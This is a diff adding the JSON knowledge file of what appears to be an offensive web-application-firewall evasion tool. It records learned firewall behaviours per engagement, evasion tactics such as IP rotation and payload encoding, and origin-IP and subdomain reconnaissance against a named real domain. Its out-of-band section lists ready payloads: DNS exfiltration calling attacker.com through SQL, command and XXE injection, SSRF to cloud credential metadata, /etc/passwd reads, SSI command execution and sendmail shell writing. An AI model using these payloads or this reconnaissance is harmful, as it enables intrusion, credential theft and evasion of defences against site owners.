+          "TRACE",
+          "PATCH"
+        ],
+        "path_patterns_blocked": [
+          "/admin",
+          "/administrator",
+          "/wp-admin",
+          "/phpmyadmin",
+          "/.env",
+          "/.git",
+          "/.git/config",
+          "/.gitignore"
+        ],
+        "payload_patterns_blocked": [
+          "<script>alert(1)</sc",
+          "' or '1'='1",
+          "union select",
+          "../../../etc/passwd",
+          "<?php system($_GET['"
+        ],
+        "ip_rotation_required": true,
+        "user_agent_sensitive": false,
+        "timing_pattern": "none"
+      },
+      "patterns": [
+        "method_blocking",
+        "path_blocking",
+        "payload_detection",
+        "ip_based_blocking"
+      ],
+      "confidence": 0.6,
+      "discovered_in": "eng_6e9b44ba",
+      "discovered_at": 1780827268.828363,
+      "evasion_tactics": [
+        "url_encoding",
+        "ip_rotation",
+        "comment_injection",
+        "proxy_rotation",
+        "http_method_variation",
+        "path_normalization",
+        "payload_encoding"
+      ]
+    },
+    "learned_waf_eng_42760e9f_603636dc4f6342f683d7c00c78eac848": {
+      "behaviors": {
+        "rate_limit_threshold": null,
+        "blocking_status_codes": [
+          403
+        ],
+        "blocking_headers": [],
+        "response_delay": 0,
+        "request_methods_blocked": [
+          "GET",
+          "POST",
+          "HEAD",
+          "OPTIONS",
+          "PUT",
+          "DELETE",
+          "TRACE",
+          "PATCH"
+        ],
+        "path_patterns_blocked": [
+          "/admin",
+          "/administrator",
+          "/wp-admin",
+          "/phpmyadmin",
+          "/.env",
+          "/.git",
+          "/.git/config",
+          "/.gitignore"
+        ],
+        "payload_patterns_blocked": [
+          "<script>alert(1)</sc",
+          "' or '1'='1",
+          "union select",
+          "../../../etc/passwd",
+          "<?php system($_GET['"
+        ],
+        "ip_rotation_required": true,
+        "user_agent_sensitive": false,
+        "timing_pattern": "none"
+      },
+      "patterns": [
+        "method_blocking",
+        "path_blocking",
+        "payload_detection",
+        "ip_based_blocking"
+      ],
+      "confidence": 0.6,
+      "discovered_in": "eng_42760e9f",
+      "discovered_at": 1780841807.3317196,
+      "evasion_tactics": [
+        "comment_injection",
+        "ip_rotation",
+        "http_method_variation",
+        "url_encoding",
+        "path_normalization",
+        "payload_encoding",
+        "proxy_rotation"
+      ]
+    },
+    "learned_waf_test_eng_29f40e8026f14ca68299f30e39b5018c": {
+      "behaviors": {},
+      "patterns": [],
+      "confidence": 0.9,
+      "discovered_in": "test_eng",
+      "discovered_at": 1780995905.5900757,
+      "evasion_tactics": []
+    },
+    "learned_waf_eng_4cc58475_34eb0ed0ac6b4cf18dca921b0a108101": {
+      "behaviors": {
+        "rate_limit_threshold": null,
+        "blocking_status_codes": [
+          403,
+          429
+        ],
+        "blocking_headers": [],
+        "response_delay": 0,
+        "request_methods_blocked": [
+          "POST",
+          "PUT",
+          "DELETE",
+          "TRACE",
+          "PATCH"
+        ],
+        "path_patterns_blocked": [
+          "/wp-admin",
+          "/.gitignore"
+        ],
+        "payload_patterns_blocked": [
+          "<script>alert(1)</sc",
+          "' or '1'='1",
+          "union select",
+          "../../../etc/passwd",
+          "<?php system($_GET['"
+        ],
+        "ip_rotation_required": true,
+        "user_agent_sensitive": false,
+        "timing_pattern": "none"
+      },
+      "patterns": [
+        "method_blocking",
+        "path_blocking",
+        "payload_detection",
+        "ip_based_blocking"
+      ],
+      "confidence": 0.6,
+      "discovered_in": "eng_4cc58475",
+      "discovered_at": 1781005865.0991843,
+      "evasion_tactics": [
+        "path_normalization",
+        "comment_injection",
+        "http_method_variation",
+        "url_encoding",
+        "payload_encoding",
+        "proxy_rotation",
+        "ip_rotation"
+      ]
+    },
+    "learned_waf_test_eng_128fe93389ca49bb932de22c49de759a": {
+      "behaviors": {},
+      "patterns": [],
+      "confidence": 0.9,
+      "discovered_in": "test_eng",
+      "discovered_at": 1781065850.2812586,
+      "evasion_tactics": []
+    },
+    "learned_waf_eng_5e1f588a_5e1d5ea95729410cad2ae2170a3555d5": {
+      "behaviors": {
+        "rate_limit_threshold": null,
+        "blocking_status_codes": [
+          403,
+          429
+        ],
+        "blocking_headers": [],
+        "response_delay": 6.49,
+        "request_methods_blocked": [
+          "GET",
+          "POST",
+          "OPTIONS",
+          "PUT",
+          "DELETE",
+          "TRACE",
+          "PATCH"
+        ],
+        "path_patterns_blocked": [],
+        "payload_patterns_blocked": [
+          "<script>alert(1)</sc",
+          "' or '1'='1",
+          "union select",
+          "../../../etc/passwd",
+          "<?php system($_GET['"
+        ],
+        "ip_rotation_required": false,
+        "user_agent_sensitive": false,
+        "timing_pattern": "consistent_delay"
+      },
+      "patterns": [
+        "response_delay",
+        "method_blocking",
+        "payload_detection",
+        "timing_detection"
+      ],
+      "confidence": 0.6,
+      "discovered_in": "eng_5e1f588a",
+      "discovered_at": 1781267762.0584972,
+      "evasion_tactics": [
+        "dummy_requests",
+        "connection_pooling",
+        "persistence",
+        "comment_injection",
+        "http_method_variation",
+        "timing_randomization",
+        "payload_encoding"
+      ]
+    },
+    "learned_waf_eng_7f6496eb_ea8ca50cbf7948fcbb44bb6d36ebc295": {
+      "behaviors": {
+        "protocol": {
+          "vectors": [
+            "HTTP/3_QUIC",
+            "HTTP/2_smuggling",
+            "WebSocket_upgrade"
+          ],
+          "confidence": 0.6,
+          "applicability": "universal"
+        },
+        "origin": {
+          "domain": "novalink.lk",
+          "discovered_ips": [
+            "216.198.79.1",
+            "162.159.205.12",
+            "216.198.79.65",
+            "162.159.205.13",
+            "162.159.205.17",
+            "92.113.145.90",
+            "64.29.17.65",
+            "162.159.205.25",
+            "162.159.205.23",
+            "162.159.205.11",
+            "188.166.218.192",
+            "162.159.205.18",
+            "162.159.205.19",
+            "162.159.205.24"
+          ],
+          "origin_candidates": [
+            {
+              "ip": "216.198.79.1",
+              "score": 1.8000000000000003,
+              "indicators": [
+                "not_cdn",
+                "ports_[80, 443, 8080, 8443, 3000, 5000, 9000]"
+              ]
+            },
+            {
+              "ip": "162.159.205.12",
+              "score": 1.8000000000000003,
+              "indicators": [
+                "not_cdn",
+                "ports_[80, 443, 8080, 8443, 3000, 5000, 9000]"
+              ]
+            },
+            {
+              "ip": "216.198.79.65",
+              "score": 1.8000000000000003,
+              "indicators": [
+                "not_cdn",
+                "ports_[80, 443, 8080, 8443, 3000, 5000, 9000]"
+              ]
+            },
+            {
+              "ip": "162.159.205.13",
+              "score": 1.8000000000000003,
+              "indicators": [
+                "not_cdn",
+                "ports_[80, 443, 8080, 8443, 3000, 5000, 9000]"
+              ]
+            },
+            {
+              "ip": "162.159.205.17",
+              "score": 1.8000000000000003,
+              "indicators": [
+                "not_cdn",
+                "ports_[80, 443, 8080, 8443, 3000, 5000, 9000]"
+              ]
+            },
+            {
+              "ip": "92.113.145.90",
+              "score": 1.8000000000000003,
+              "indicators": [
+                "not_cdn",
+                "ports_[80, 443, 8080, 8443, 3000, 5000, 9000]"
+              ]
+            },
+            {
+              "ip": "64.29.17.65",
+              "score": 1.8000000000000003,
+              "indicators": [
+                "not_cdn",
+                "ports_[80, 443, 8080, 8443, 3000, 5000, 9000]"
+              ]
+            },
+            {
+              "ip": "162.159.205.25",
+              "score": 1.8000000000000003,
+              "indicators": [
+                "not_cdn",
+                "ports_[80, 443, 8080, 8443, 3000, 5000, 9000]"
+              ]
+            },
+            {
+              "ip": "162.159.205.23",
+              "score": 1.8000000000000003,
+              "indicators": [
+                "not_cdn",
+                "ports_[80, 443, 8080, 8443, 3000, 5000, 9000]"
+              ]
+            },
+            {
+              "ip": "162.159.205.11",
+              "score": 1.8000000000000003,
+              "indicators": [
+                "not_cdn",
+                "ports_[80, 443, 8080, 8443, 3000, 5000, 9000]"
+              ]
+            },
+            {
+              "ip": "188.166.218.192",
+              "score": 1.8000000000000003,
+              "indicators": [
+                "not_cdn",
+                "ports_[80, 443, 8080, 8443, 3000, 5000, 9000]"
+              ]
+            },
+            {
+              "ip": "162.159.205.18",
+              "score": 1.8000000000000003,
+              "indicators": [
+                "not_cdn",
+                "ports_[80, 443, 8080, 8443, 3000, 5000, 9000]"
+              ]
+            },
+            {
+              "ip": "162.159.205.19",
+              "score": 1.8000000000000003,
+              "indicators": [
+                "not_cdn",
+                "ports_[80, 443, 8080, 8443, 3000, 5000, 9000]"
+              ]
+            },
+            {
+              "ip": "162.159.205.24",
+              "score": 1.8000000000000003,
+              "indicators": [
+                "not_cdn",
+                "ports_[80, 443, 8080, 8443, 3000, 5000, 9000]"
+              ]
+            }
+          ],
+          "techniques_used": [
+            "current_dns",
+            "subdomain_enumeration",
+            "mail_server_lookup"
+          ],
+          "metadata": {
+            "current_dns": [
+              "216.198.79.1"
+            ],
+            "subdomains": [
+              "proxy.novalink.lk",
+              "www.novalink.lk",
+              "cdn.novalink.lk"
+            ],
+            "mail_ips": [
+              "162.159.205.19",
+              "162.159.205.12",
+              "162.159.205.13",
+              "162.159.205.17",
+              "162.159.205.25",
+              "162.159.205.23",
+              "162.159.205.11",
+              "162.159.205.18",
+              "162.159.205.24"
+            ]
+          },
+          "confidence": 0.3333333333333333
+        },
+        "credentials": {
+          "engagement_id": "eng_7f6496eb",
+          "target": "https://novalink.lk/",
+          "credentials_found": [],
+          "suggested_headers": {}
+        },
+        "cache": {
+          "vectors": [
+            "cache_key_manipulation",
+            "host_header_bypass",
+            "normalization_abuse"
+          ],
+          "confidence": 0.5,
+          "requires": "CDN or cache layer detected"
+        },
+        "smuggling": {
+          "target": "https://novalink.lk/",
+          "vulnerable_to": [],
+          "smuggling_vectors": [],
+          "confidence": 0.0
+        },
+        "headless": {
+          "vectors": [
+            "JavaScript_execution",
+            "DOM_injection",
+            "Service_worker"
+          ],
+          "confidence": 0.4,
+          "dependencies": [
+            "Playwright",
+            "Puppeteer"
+          ]
+        },
+        "oob": {
+          "target": "https://novalink.lk/",
+          "oob_vectors": [
+            {
+              "name": "DNS Exfiltration",
+              "method": "dns",
+              "description": "Exfiltrate data via DNS queries to collaborator",
+              "waf_bypassed": true,
+              "direct_waf_contact": false,
+              "injection_points": {
+                "sql_injection": "' UNION SELECT version() INTO OUTFILE '/tmp/x'; system('nslookup `cat /tmp/x`.attacker.com'); -- -",
+                "command_injection": "; nslookup $(whoami).attacker.com; #",
+                "xxe": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'expect://nslookup $(whoami).attacker.com'>]>"
+              },
+              "execution_methods": {
+                "mysql": "SELECT load_file(CONCAT('\\\\\\\\', version(), '.attacker.com\\\\share'))",
+                "postgres": "COPY (SELECT version()) TO '/tmp/x'; system('nslookup ' || `/tmp/x` || '.attacker.com')",
+                "ldap": "(|(cn=*)(nslookup $(whoami).attacker.com))",
+                "redis": "DEBUG OBJECT attacker.com:6379"
+              }
+            },
+            {
+              "name": "SSRF - Image Upload",
+              "method": "ssrf_image",
+              "description": "SSRF via image upload/processing endpoint (often less protected)",
+              "endpoint": "/upload",
+              "payload": {
+                "url": "file:///etc/passwd",
+                "source": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+              },
+              "bypass_reason": "Image endpoints often have different WAF rules"
+            },
+            {
+              "name": "SSRF - Webhook",
+              "method": "ssrf_webhook",
+              "description": "SSRF via webhook/callback parameter",
+              "endpoint": "/webhook",
+              "parameters": {
+                "callback_url": "http://169.254.169.254/latest/meta-data/",
+                "webhook_url": "gopher://internal-service:6379/_COMMAND"
+              },
+              "internal_targets": [
+                "http://localhost:6379",
+                "http://127.0.0.1:27017",
+                "http://169.254.169.254"
+              ]
+            },
+            {
+              "name": "SSRF - URL Parser",
+              "method": "ssrf_url_parser",
+              "description": "SSRF via URL parsing parameter",
+              "endpoint": "/api/fetch",
+              "payloads": [
+                "http://localhost:8080/admin",
+                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+                "file:///etc/passwd",
+                "gopher://internal-db:6379/_INFO",
+                "dict://internal-service:11211/stats"
+              ]
+            },
+            {
+              "name": "Blind XXE with OOB",
+              "method": "blind_xxe",
+              "description": "Blind XXE using external entity callbacks",
+              "injection_points": {
+                "xml_upload": {
+                  "content_type": "application/xml",
+                  "payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [  <!ELEMENT foo ANY >  <!ENTITY xxe SYSTEM \"expect://nslookup `cat /etc/passwd`.collaborator.oob\" >]><foo>&xxe;</foo>"
+                },
+                "svg_upload": {
+                  "content_type": "image/svg+xml",
+                  "payload": "<?xml version=\"1.0\"?><!DOCTYPE svg [  <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><svg>&xxe;</svg>"
+                }
+              },
+              "exfil_channels": [
+                "dns",
+                "http_callback",
+                "ftp",
+                "expect"
+              ]
+            },
+            {
+              "name": "Server-Side Includes",
+              "method": "ssi",
+              "description": "Execute commands via SSI in static files",
+              "file_extensions": [
+                ".shtml",
+                ".shtm",
+                ".stm",
+                ".html"
+              ],
+              "injection_points": [
+                "/upload",
+                "/assets",
+                "/static",
+                "/files",
+                "/documents"
+              ],
+              "payloads": [
+                "<!--#exec cmd='/bin/id' -->",
+                "<!--#exec cmd='nslookup `whoami`.attacker.com' -->",
+                "<!--#config timefmt='%Y-%m-%d' -->",
+                "<!--#fsize file='/etc/passwd' -->"
+              ],
+              "bypass_reason": "Static file endpoints often bypass WAF"
+            },
+            {
+              "name": "Mail Header Injection",
+              "method": "mail_injection",
+              "description": "Command execution via mail() function injection",
+              "injection_points": {
+                "contact_form": {
+                  "parameter": "email",
+                  "payload": "-X /tmp/shell.php"
+                },
+                "newsletter": {
+                  "parameter": "recipient",
+                  "payload": "-C /tmp/sendmail.conf"
+                }
+              },
+              "execution_techniques": [
+                "-X - log file redirection",
+                "-C - config file injection",
+                "-O - option override",
+                "-d - debug mode"
+              ],
+              "typical_endpoints": [
+                "/contact",
+                "/subscribe",
+                "/newsletter",
+                "/feedback"
+              ]
+            },
+            {
+              "name": "LDAP Injection OOB",
+              "method": "ldap_oob",
+              "description": "LDAP injection with out-of-band callbacks",
+              "injection_points": {
+                "login": {
+                  "username": "*",
+                  "password": "*)(|(cn=*collaborator.oob"
+                },
+                "search": {
+                  "filter": "*collaborator.oob*"
+                }
+              },
+              "oob_methods": [
+                "LDAP -> HTTP callback",
+                "LDAP -> DNS lookup"
+              ]
+            }
+          ],
+          "exfil_methods": [
+            "dns",
+            "ssrf_image",
+            "ssrf_webhook",
+            "ssrf_url_parser",
+            "blind_xxe",
+            "ssi",
+            "mail_injection",
+            "ldap_oob"
+          ],
+          "bypass_techniques": [
+            "dns_exfil",
+            "ssrf_internal",
+            "blind_xxe",
+            "ssi",
+            "mail_injection",
+            "ldap_oob"
+          ]
+        },
+        "legitimacy": {
+          "vectors": [
+            "bot_fingerprint_spoofing",
+            "device_fingerprint_randomization",
+            "geographic_diversity"
+          ],
+          "confidence": 0.7,
+          "applicability": "behavioral_detection_bypass"
+        },
+        "waf_logic": {
+          "vectors": [
+            "regex_bypass",
+            "parser_confusion",
+            "rule_whitelist_abuse",
+            "cve_exploitation"
+          ],
+          "confidence": 0.5,
+          "requires": "WAF fingerprinting"
+        },
+        "exhaustion": {
+          "vectors": [
+            "buffer_padding",
+            "redos_fail_open"
+          ],
+          "confidence": 0.6,
+          "requires": "High bandwidth / POST capability"
+        },
+        "parser_confusion": {
+          "vectors": [
+            "hpp",
+            "content_type_manipulation",
+            "boundary_confusion"
+          ],
+          "confidence": 0.7,
+          "requires": "Parameter mapping"
+        }
+      },
+      "patterns": [
+        "origin"
+      ],
+      "confidence": 0.8,
+      "discovered_in": "eng_7f6496eb",
+      "discovered_at": 1781367397.6497796,
+      "evasion_tactics": []
+    },
+    "learned_waf_eng_a4345f6f_d09787b7f0d84c1abbcbfd2192d6911d": {
+      "behaviors": {},
+      "patterns": [],
+      "confidence": 0.0,
+      "discovered_in": "eng_a4345f6f",
+      "discovered_at": 1781896752.747604,
+      "evasion_tactics": []
+    }
+  },
+  "tactics": {
+    "header_mutation": {
+      "overall_success_rate": 1.0,
+      "per_waf": {
+        "generic": {
+          "success_rate": 1.0,
+          "successes": 442,
+          "failures": 0,
+          "total_runs": 442,
+          "last_updated": 1782328540.804369
+        }
+      }
+    },
+    "stealth_headers": {
+      "overall_success_rate": 1.0,
+      "per_waf": {
+        "test_waf": {
+          "success_rate": 1.0,
+          "successes": 1,
+          "failures": 0,
+          "total_runs": 1,
+          "last_updated": 1781065850.291063
+        }
+      }
+    }
+  }
+}
